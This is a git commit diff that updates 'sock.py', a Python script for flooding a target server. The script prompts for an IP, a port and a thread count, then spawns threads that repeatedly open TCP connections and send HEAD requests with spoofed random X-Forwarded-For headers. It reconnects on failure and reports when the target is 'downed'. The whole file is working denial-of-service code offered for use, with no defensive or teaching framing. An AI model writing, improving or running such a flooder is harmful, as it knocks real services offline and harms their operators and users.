047fad45cedf4df9bdb20bac7768c02b06c263f1
LocalUser <121312523+localuser-isback@users.noreply.github.com>
2023-01-09 17:46:01 -0500

    Update sock.py

--- sock.py
+++ sock.py
@@ -2,6 +2,9 @@ import socket
 import os, sys
 import time
 import threading, random
+from os import urandom as randbytes
+
+os.system('cls||clear')
 
 print('''
 ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗  ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗
@@ -16,41 +19,46 @@ th = int(input("Threads: "))
 
 url = "http://" + str(ip)
 
+
 def randomip():
-  randip = ".".join(map(str, (random.randint(0, 255) 
-                                    for _ in range(4))))
-  return(randip)
+	randip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+	return (randip)
+
 
 print("[>>>] Starting the attack [<<<]")
 
-
-time.sleep(1)
-
 inf = 1000000000
 
+
 def attack():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  for i in range(1, inf):
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(.1)
-    except:
-      pass
+	connection = "Connection: Keep-Alive\r\n"
+	referer = "Referer: null\r\n"
+	forward = "X-Forwarded-For: " + randomip() + "\r\n"
+	get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+	request = get_host + referer + connection + forward + "\r\n\r\n"
+	try:
+		atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		atk.connect((ip, port))
+	except:
+		print("Cannot connect, Try a different port.")
+	for i in range(1, inf):
+		try:
+			atk.send(str.encode(request))
+		except:
+			try:
+				atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				atk.connect((ip, port))
+			except:
+				print("Downed or lost connection.")
 
 
 def threader():
-		global threads
-		threads=[]
-		for i in range(th):
-				t=threading.Thread(target=attack)
-				threads.append(t)
-				t.start()
+	global threads
+	threads = []
+	for i in range(th):
+		t = threading.Thread(target=attack)
+		threads.append(t)
+		t.start()
+
+
 threader()
